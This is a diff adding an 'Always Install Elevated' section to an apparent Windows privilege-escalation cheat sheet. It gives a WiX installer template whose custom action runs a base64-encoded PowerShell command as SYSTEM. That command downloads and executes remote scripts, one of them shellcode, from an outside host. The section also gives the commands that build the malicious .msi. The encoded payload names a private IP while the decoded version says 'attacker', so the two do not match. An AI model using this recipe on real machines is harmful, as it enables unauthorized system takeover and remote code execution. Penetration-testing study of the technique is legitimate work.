@@ -569,6 +569,56 @@ set AutoRunScript post/windows/manage/migrate name=explorer.exe spawn=false
 
 ### Windows
 
+#### Always Install Elevated
+
+If we have enabled a privilege which allow us to ALWAYS install with elevated privileges, we can craft a .msi leveranging wixtools, specifically with candl.exe and light.exe.
+The steps are as follows:
+
+1 - Create a malicious .xml wix file:
+
+```texinfo
+<?xml version="1.0"?>
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+    <Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name" Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
+        <Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
+        <Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
+        <Directory Id="TARGETDIR" Name="SourceDir">
+            <Directory Id="ProgramFilesFolder">
+                <Directory Id="INSTALLLOCATION" Name="Example">
+                 <Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
+                    </Component>
+                </Directory>
+            </Directory>
+        </Directory>
+        <Feature Id="DefaultFeature" Level="1">
+            <ComponentRef Id="ApplicationFiles"/>
+        </Feature>
+        <CustomAction Id="SystemShell" Directory="TARGETDIR" ExeCommand="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgA5ADIALwBuAGkAZQByAGkALgBwAHMAMQAnACkAOwBJAEUAWAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADkAMgAvAHIAdQBuAC0AcwBoAGUAbABsAGMAbwBkAGUALQA2ADQAYgBpAHQALgBwAHMAMQAtAGYAcgBvAG0AOQAyAC0AOAAwADgAMQBwAG8AcgB0ACcAKQAKAA==" Execute="deferred" Impersonate="no" Return="ignore"/>
+        <InstallExecuteSequence>
+            <Custom Action="SystemShell" After="InstallInitialize"></Custom>
+        </InstallExecuteSequence>
+    </Product>
+</Wix>
+```
+
+The powershell in b64 executed is this one:
+
+```powershell
+IEX(New-Object Net.Webclient).downloadString('http://attacker/nieri.ps1');IEX(New-Object Net.Webclient).downloadString('http://attacker/run-shellcode-64bit.ps1')
+```
+
+2 - Create a malicious .wix (this step and next one MUST be run from the path where the wix tools are located)
+
+```texinfo
+candle.exe ..\bad-wix-pe.xml -out ..\reverse.wix
+```
+
+3 - Create the malicious .msi from the .wix
+
+```texinfo
+light.exe ..\reverse.wix -out ..\vamosvamos.msi
+```
+
 #### Run-As
 
 ```console
